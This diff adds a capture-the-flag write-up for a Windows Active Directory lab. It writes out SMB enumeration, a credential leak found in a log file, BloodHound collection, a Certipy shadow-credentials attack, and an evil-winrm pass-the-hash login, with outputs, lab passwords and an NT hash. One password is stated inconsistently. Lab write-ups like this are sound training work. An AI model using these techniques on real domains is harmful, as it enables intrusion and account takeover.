@@ -1,0 +1,140 @@
+# Profile
+- Lab: Logging
+- ip: 10.129.245.130
+- Category: Windows Lab
+
+# Enumeration
+nmap -sC -sV -p- 10.129.245.130 -oN nmap_logging
+
+# As wallace.everette:Welcome2026@
+The IIS seems to not be configured.
+The smb enumeration seems to reveal some results:
+smbmap -H 10.129.245.130 -d logging.htb -u wallace.everette -p Welcome2026@
+```bash
+[+] IP: 10.129.245.130:445      Name: logging.htb               Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        Logs                                                    READ ONLY
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
+```
+smbclient '\\10.129.245.130\logs' -U wallace.everette%Welcome2026@
+```bash
+smbclient  '\\10.129.245.130\logs' -U wallace.everette%Welcome2026@
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Apr 16 23:10:09 2026
+  ..                                  D        0  Thu Apr 16 23:10:09 2026
+  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
+  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
+  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
+  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
+
+                6657279 blocks of size 4096. 2098709 blocks available
+```
+We get those files and look into them for sensitive informations.
+```IdentitySync_Trace_20260219.log
+[2026-02-19 02:50:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
+[2026-02-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).
+[2026-02-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)
+[2026-02-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16G
+B
+[2026-02-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
+[2026-02-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
+[2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
+[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
+[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
+[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
+[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
+[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
+   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
+   at logging.IdentitySync.Engine.LdapProvider.Connect()
+   --- Server Error Details ---
+   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
+   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
+   Win32 Error: 49 (Invalid Credentials)
+   ----------------------------
+[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\svc_recovery. Checking alternate Do
+main Controller...
+[2026-02-09 03:00:03.650] [PID:4102] [Thread:12] CRITICAL - Domain-wide LDAP bind failure. Task aborted.
+[2026-02-10 03:00:03.702] [PID:4102] [Thread:12] DEBUG - Generating SMTP alert for it-alerts@logging.htb
+[2026-02-10 03:00:04.112] [PID:4102] [Thread:12] INFO  - Process exit code: 1. Cleaning up session buffers.
+[2026-02-10 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
+```
+We found "HR01.logging.htb", "svc_recovery:Em3rg3ncyPa$$2025", "SQL session [loggingHR].[dbo].[Employees] where SyncStatus = 0" and a lot more of pertinent information.
+
+Then I use the following to get bloodhound zip and identify some priv path
+bloodhound-python -u 'wallace.everette' -p 'Welcome2026@' -d 'logging.htb' -c All --zip --dns-tcp -ns 10.129.245.130
+
+svc_recovery has Genericwrite on MSA_HEALTH
+
+## As msa_health
+We find a file monitor.ps1 in the directory when we log in with evil-winrm that we download.
+We also find the UpdateMonitor.exe ( C:\Program Files\UpdateMonitor\ ) that we download and decompile ( I use ILspy )
+
+
+
+# Exploitation
+## As svc_recovery
+When trying to work with password 2025 it fails but it works with 2026 , seems this is why there was an error on the log: The password for svc_recovery is Em3rg3ncy2026.
+
+```/etc/krb5.conf
+[libdefaults]
+    default_realm = LOGGING.HTB
+    rdns = false
+
+[realms]
+    LOGGING.HTB = {
+        kdc = 10.129.245.130
+        admin_server = 10.129.245.130
+    }
+
+[domain_realm]
+    .logging.htb = LOGGING.HTB
+    logging.htb = LOGGING.HTB
+
+```
+After enabling ntp `sudo timedatectl set-ntp true` and sync with the target `sudo ntp-date logging.htb`, we get the ticket:
+```bash
+impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.245.130 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in svc_recovery.ccache
+```
+```bash
+KRB5CCNAME=svc_recovery.ccache certipy shadow auto   -u 'svc_recovery@logging.htb' -k -no-pass   -account 'msa_health$'   -dc-ip 10.129.245.130   -target DC01.logging.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user 'msa_health$'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'c86c79ed2f26490499cdabb1ab2d0fee'
+[*] Adding Key Credential with device ID 'c86c79ed2f26490499cdabb1ab2d0fee' to the Key Credentials for 'msa_health$'
+[*] Successfully added Key Credential with device ID 'c86c79ed2f26490499cdabb1ab2d0fee' to the Key Credentials for 'msa_health$'
+[*] Authenticating as 'msa_health$' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'msa_health$@logging.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'msa_health.ccache'
+[*] Wrote credential cache to 'msa_health.ccache'
+[*] Trying to retrieve NT hash for 'msa_health$'
+[*] Restoring the old Key Credentials for 'msa_health$'
+[*] Successfully restored the old Key Credentials for 'msa_health$'
+[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
+```
+In fact, I test if we really need the /etc/krb5.conf, but it seems we don't ( so you can set up well the time sync ).
+
+`evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5' `
+
+
+# Links
+https://logandawson.com/writeups/season10/logging/
+https://github.com/ZhengJJ05/WriteUp/blob/main/HTB/Season10/Logging/Logging.md
